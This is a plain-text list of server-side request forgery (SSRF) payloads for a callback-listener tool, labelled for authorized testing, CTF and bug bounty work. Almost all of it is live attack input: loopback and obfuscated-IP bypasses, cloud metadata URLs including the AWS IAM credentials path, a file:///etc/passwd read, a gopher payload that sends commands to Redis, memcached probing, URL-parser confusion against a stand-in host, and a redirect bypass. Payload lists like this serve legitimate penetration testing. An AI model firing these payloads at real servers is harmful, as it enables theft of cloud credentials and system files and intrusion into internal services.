===========================================================================
 GoCatcher :: SSRF test payloads  (text/plain)
 FOR AUTHORIZED TESTING / CTF / BUG BOUNTY ONLY.
 Feed these as URL/host inputs to the target. A hit on GoCatcher confirms the
 server made the outbound request. Replace 127.0.0.1:8080 with your
 --serveo / EC2 URL when testing a remote target.
===========================================================================

# 1) Callback confirmation (watch GoCatcher's log for this path):
http://127.0.0.1:8080/ssrf-hit
http://127.0.0.1:8080/ssrf-hit?src=TARGET

# 2) Localhost / loopback bypasses:
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/
http://127.1/
http://127.0.0.1.nip.io/
http://localtest.me/

# 3) IP obfuscation (all = 127.0.0.1):
http://2130706433/          # decimal
http://0x7f000001/          # hex
http://0177.0.0.1/          # octal
http://0x7f.0x0.0x0.0x1/

# 4) Cloud metadata (read-only recon on authorized assets):
http://169.254.169.254/latest/meta-data/                         # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://metadata.google.internal/computeMetadata/v1/              # GCP (Header: Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure (Header: Metadata: true)

# 5) Scheme / parser abuse:
file:///etc/passwd
gopher://127.0.0.1:6379/_%0d%0aINFO%0d%0a                        # Redis via gopher
dict://127.0.0.1:11211/stats                                     # memcached
http://TARGET@127.0.0.1/                                         # userinfo confusion
http://127.0.0.1#@evil.test/                                     # fragment confusion

# 6) Redirect-based bypass (GoCatcher 302 -> internal):
http://127.0.0.1:8080/ssrf-redir
